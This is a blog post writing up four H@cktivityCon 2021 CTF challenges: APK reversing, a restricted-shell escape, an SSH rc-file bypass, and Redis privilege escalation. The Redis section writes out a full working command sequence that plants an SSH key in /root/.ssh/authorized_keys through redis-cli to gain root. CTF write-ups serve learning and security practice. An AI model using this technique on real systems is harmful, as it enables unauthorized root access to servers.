+++
title = "H@cktivityCon 2021 CTF Writeup"
date = "2021-09-18"
author = ""
authorTwitter = "" #do not include @
cover = ""
tags = ["CTF"]
keywords = ["", ""]
description = ""
showFullContent = false
toc = true
images = ["/img/hacktivitycon-2021/hacktivity.jpeg"]
+++

<!--more-->
{{< image src="/img/hacktivitycon-2021/hacktivity.jpeg" alt="" position="center" style="border-radius: 8px;" >}}

## Introduction

H@cktivityCon 2021 was happening over the weekend and I participated in their ctf with team [@fr334aks](https://twitter.com/fr334aks). We managed position 49 out of 2527 teams.
This writeup is of the challenges I managed to solve.

## Challenges

### 1. Mobile: To Do

Challenge Description:

{{< image src="/img/hacktivitycon-2021/to-do-1.png" alt="" position="center" style="border-radius: 8px;" >}}

We are provided with an apk file. First thing I typically do with apk files is open them with jadx-gui. 

```sh
jadx-gui todo.apk
```

Here I first look at the AndroidManifest.xml to see the application entry point. 

{{< image src="/img/hacktivitycon-2021/to-do-2.png" alt="" position="center" style="border-radius: 8px;" >}}

For this app it's LoginActivity. It checks if the input provided is equal to `testtest` and if true it goes on to load MainActivity.

{{< image src="/img/hacktivitycon-2021/to-do-3.png" alt="" position="center" style="border-radius: 8px;" >}}

When we install the application and supply the password as `testtest` we get the flag.

{{< image src="/img/hacktivitycon-2021/to-do-5.png" alt="" position="center" style="border-radius: 8px;" >}}

{{< image src="/img/hacktivitycon-2021/to-do-6.png" alt="" position="center" style="border-radius: 8px;" >}}

Unfortunately I couldn't copy it out and typing it would have been a pain. Back on the MainActivity we see it loads MyDatabase.

{{< image src="/img/hacktivitycon-2021/to-do-4.png" alt="" position="center" style="border-radius: 8px;" >}}

When we look at MyDatabase, it loads an sqlite database `todos.db`. A lot of the times sqlitedb database in android apps are stored within
the apk.

{{< image src="/img/hacktivitycon-2021/to-do-7.png" alt="" position="center" style="border-radius: 8px;" >}}

Extracting the apk using apktool I was able to access the sqlitedb and extract the flag.

{{< image src="/img/hacktivitycon-2021/to-do-8.png" alt="" position="center" style="border-radius: 8px;" >}}

### 2. Miscellaneous: Shelle 

Challenge Description:

{{< image src="/img/hacktivitycon-2021/shelle-1.png" alt="" position="center" style="border-radius: 8px;" >}}

When we connect to the challenge, we get access to a restricted shell with only a few commands we can run.

{{< image src="/img/hacktivitycon-2021/shelle-2.png" alt="" position="center" style="border-radius: 8px;" >}}

When we read the assignment, we are told the flag is in the /opt directory.

{{< image src="/img/hacktivitycon-2021/shelle-3.png" alt="" position="center" style="border-radius: 8px;" >}}

Unfortunately we can't access it.

{{< image src="/img/hacktivitycon-2021/shelle-4.png" alt="" position="center" style="border-radius: 8px;" >}}

Next I tried to see if we can access any environment variables and see if the `$` character is forbidden as well.
Luckily this works.

{{< image src="/img/hacktivitycon-2021/shelle-5.png" alt="" position="center" style="border-radius: 8px;" >}}

I then ran `set` to list all environment variables. Looking through the list I saw one set to bash.

{{< image src="/img/hacktivitycon-2021/shelle-6.png" alt="" position="center" style="border-radius: 8px;" >}}

I was able to use it to escape the restricted shell and read the flag.

{{< image src="/img/hacktivitycon-2021/shelle-7.png" alt="" position="center" style="border-radius: 8px;" >}}

### 3. Miscellaneous: Redlike

Challenge Description:

{{< image src="/img/hacktivitycon-2021/redlike-1.png" alt="" position="center" style="border-radius: 8px;" >}}

After sshing into the challenge machine, I performed some local enumeration and when checking for running processes
we see redis running locally as root. Clearly this is the privesc path.

{{< image src="/img/hacktivitycon-2021/redlike-2.png" alt="" position="center" style="border-radius: 8px;" >}}

I immediately jumped to [hacktricks](https://book.hacktricks.xyz/pentesting/6379-pentesting-redis#ssh) and used the below commands to escalate privileges.

```sh
ssh-keygen -f redis

(echo -e "\n\n"; cat redis.pub; echo -e "\n\n") > spaced_key.txt

cat spaced_key.txt | redis-cli -h 127.0.0.1 -x set ssh_key

redis-cli -h 127.0.0.1

config set dir /root/.ssh

config set dbfilename "authorized_keys"

save

chmod 600 redis

ssh -i redis root@127.0.0.1
```

{{< image src="/img/hacktivitycon-2021/redlike-3.png" alt="" position="center" style="border-radius: 8px;" >}}

### 4. Race Car

Challenge Description:

{{< image src="/img/hacktivitycon-2021/racecar-1.png" alt="" position="center" style="border-radius: 8px;" >}}

I enjoyed this one as I was the second to solve it.

When we ssh into the challenge machine, the session is immediately closed when we provide the password.

{{< image src="/img/hacktivitycon-2021/racecar-2.png" alt="" position="center" style="border-radius: 8px;" >}}

I tried different techniques I knew for restricted shell bypass with ssh but none worked. I got an idea to use sftp and 
see what configuration files could be causing this behaviour.

With sftp we are not kicked out and can look at files. Two files seem to be of interest but only `rc` in .ssh has contents.

{{< image src="/img/hacktivitycon-2021/racecar-3.png" alt="" position="center" style="border-radius: 8px;" >}}

The rc file is the one responsible for getting us kicked out. I tried deleting it but that didn't work. However, since we have write 
permissions, I was able to overwrite it by uploading an empty file with the same name.

Once that was done we can ssh and get the flag.

{{< image src="/img/hacktivitycon-2021/racecar-4.png" alt="" position="center" style="border-radius: 8px;" >}}


## Conclusion

Thanks HackerOne, John Hammond and the CTF challenge creators, it was a fun one!
